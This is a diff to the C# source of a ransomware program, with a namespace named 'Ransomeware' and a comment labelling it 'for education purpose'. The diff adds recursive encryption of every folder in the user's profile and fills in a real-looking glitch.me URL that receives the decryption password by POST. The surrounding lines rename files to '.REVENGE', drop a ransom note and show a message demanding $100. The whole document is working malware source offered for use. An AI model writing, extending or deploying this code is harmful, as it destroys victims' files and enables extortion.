@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Data;
 using System.Linq;
 using System.Windows.Forms;
@@ -17,11 +17,12 @@ namespace Ransomeware
         //.NET FRAMEWORK 4.0
         //FOR EDUCATION PURPOSE.
         //NOTE: I didn't try this ransomeware but i think it works perfectly, try it on a virtual machine and tell me if you face any problem in issues.
+        string password = GeneratePassword(16);
         private void Form1_Load(object sender, EventArgs e)
         {
             var directory = Directory.GetFiles(@"C:\Users\" + Environment.UserName);
-            string password = GeneratePassword(16);
-            string host = "your host url for example you can use glitch.com to create node.js express app";
+            var folders = Directory.GetDirectories(@"C:\Users\" + Environment.UserName);
+            string host = "https://curious-mercurial-apology.glitch.me/new";
 
             //sending a post request to your host includes the password to decrypt files
             var httpWebRequest = (HttpWebRequest)WebRequest.Create(host);
@@ -47,7 +48,10 @@ namespace Ransomeware
                 var result = streamReader.ReadToEnd();
             }
 
-
+            foreach(var folder in folders)
+            {
+                encryptDirectory(folder);
+            }
             //encrypting all files in the victim user directory .
             foreach (var file in directory)
             {
@@ -55,6 +59,7 @@ namespace Ransomeware
                 File.WriteAllBytes(file, bytesEncrypted);
                 File.Move(file, file + ".REVENGE");
             }
+
 
             File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "//ReadToRestore.txt", @"if you want to restore your files, send me 100$");
             MessageBox.Show("All your files gone, send me 100$ to restore your files or die", "GG", MessageBoxButtons.OK, MessageBoxIcon.Warning);
@@ -65,6 +70,28 @@ namespace Ransomeware
             //File.Move(Environment.CurrentDirectory + "//a.REVENGE", Environment.CurrentDirectory + "//a.txt");
             //---
 
+        }
+
+        void encryptDirectory(string location)
+        {
+            try
+            {
+                string[] files = Directory.GetFiles(location);
+                string[] childDirectories = Directory.GetDirectories(location);
+                for (int i = 0; i < files.Length; i++)
+                {
+                    string extension = Path.GetExtension(files[i]);
+                    byte[] bytesEncrypted = Encrypt(File.ReadAllBytes(files[i]), password);
+                    File.WriteAllBytes(files[i], bytesEncrypted);
+                    File.Move(files[i], files[i] + ".REVENGE");
+
+                }
+                for (int i = 0; i < childDirectories.Length; i++)
+                {
+                    encryptDirectory(childDirectories[i]);
+                }
+            }
+            catch { }
         }
 
         private static Random random = new Random();
